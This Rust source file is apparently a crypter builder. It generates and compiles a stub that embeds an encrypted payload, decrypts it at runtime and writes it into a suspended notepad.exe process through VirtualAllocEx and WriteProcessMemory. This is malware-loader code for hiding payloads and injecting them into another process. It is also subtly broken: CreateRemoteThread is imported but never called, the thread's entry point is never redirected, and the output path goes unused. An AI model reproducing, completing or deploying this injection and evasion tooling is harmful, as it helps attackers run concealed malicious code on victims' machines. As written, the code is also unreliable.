use std::fs;
use std::path::Path;
use std::process::Command;

/// Generates the stub file with embedded encrypted payload.
pub fn generate_stub(encrypted_payload: &[u8], key: &[u8], nonce: &[u8], encryption_type: &str, output_path: &str) {
    let project_path = "stub_project";
    let src_path = format!("{}/src", project_path);

    if !Path::new(&src_path).exists() {
        fs::create_dir_all(&src_path).expect("Failed to create stub project directories");
    }

    let stub_code = format!(
        r#"
        use std::ffi::CString;
        use std::ptr::null_mut;
        use windows::core::{{PCSTR, PSTR}};
        use windows::Win32::Foundation::HANDLE;
        use windows::Win32::System::Memory::{{VirtualAllocEx, MEM_COMMIT, PAGE_EXECUTE_READWRITE}};
        use windows::Win32::System::Threading::{{
            CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA, CREATE_SUSPENDED, CreateRemoteThread
        }};
        use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
        use aes_gcm::{{Aes256Gcm, Key, Nonce, aead::{{Aead, KeyInit}}}};
        use chacha20poly1305::{{ChaCha20Poly1305, Key as ChaChaKey, Nonce as ChaChaNonce, aead::Aead as ChaChaAead}};

        const ENCRYPTED_PAYLOAD: &[u8] = &{:?};
        const KEY: &[u8] = &{:?};
        const NONCE: &[u8] = &{:?};
        const ENCRYPTION_TYPE: &str = "{}";

        fn decrypt_and_execute() {{
            let decrypted = if ENCRYPTION_TYPE == "AES-256" {{
                let cipher = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(KEY));
                cipher.decrypt(Nonce::from_slice(NONCE), ENCRYPTED_PAYLOAD).expect("Decryption failed")
            }} else {{
                let cipher = ChaCha20Poly1305::new(ChaChaKey::from_slice(KEY));
                cipher.decrypt(ChaChaNonce::from_slice(NONCE), ENCRYPTED_PAYLOAD).expect("Decryption failed")
            }};

            let mut startup_info: STARTUPINFOA = unsafe {{ std::mem::zeroed() }};
            let mut process_info: PROCESS_INFORMATION = unsafe {{ std::mem::zeroed() }};

            let mut command_line = CString::new("C:\\Windows\\System32\\notepad.exe").unwrap();
            let mut command_line_buffer = command_line.into_bytes_with_nul();
            let command_line_ptr = PSTR(command_line_buffer.as_mut_ptr());

            let success = unsafe {{
                CreateProcessA(
                    PCSTR::null(),
                    command_line_ptr,
                    None,
                    None,
                    false,
                    CREATE_SUSPENDED,
                    None,
                    None,
                    &mut startup_info,
                    &mut process_info
                )
            }};

            if !success.as_bool() {{
                eprintln!("CreateProcessA failed");
                return;
            }}

            let base_address = unsafe {{
                VirtualAllocEx(
                    process_info.hProcess,
                    None,
                    decrypted.len(),
                    MEM_COMMIT,
                    PAGE_EXECUTE_READWRITE,
                )
            }};

            if base_address.is_null() {{
                eprintln!("VirtualAllocEx failed");
                return;
            }}

            let mem_success = unsafe {{
                WriteProcessMemory(
                    process_info.hProcess,
                    base_address,
                    decrypted.as_ptr() as _,
                    decrypted.len(),
                    None
                )
            }};

            if !mem_success.as_bool() {{
                eprintln!("WriteProcessMemory failed");
                return;
            }}

            unsafe {{
                ResumeThread(process_info.hThread);
            }}
        }}

        fn main() {{
            decrypt_and_execute();
        }}
    "#,
        encrypted_payload, key, nonce, encryption_type
    );

    fs::write(format!("{}/src/main.rs", project_path), stub_code).expect("Failed to write stub code");

    println!("[*] Stub project created in stub_project/");

    let output = Command::new("cargo")
        .args(&["build", "--release"])
        .current_dir(project_path)
        .output()
        .expect("Failed to execute cargo build");

    if output.status.success() {
        println!("[*] Compilation successful: {}", output_path);
    } else {
        eprintln!("[!] Cargo build failed.");
        eprintln!("{}", String::from_utf8_lossy(&output.stderr));
    }
}
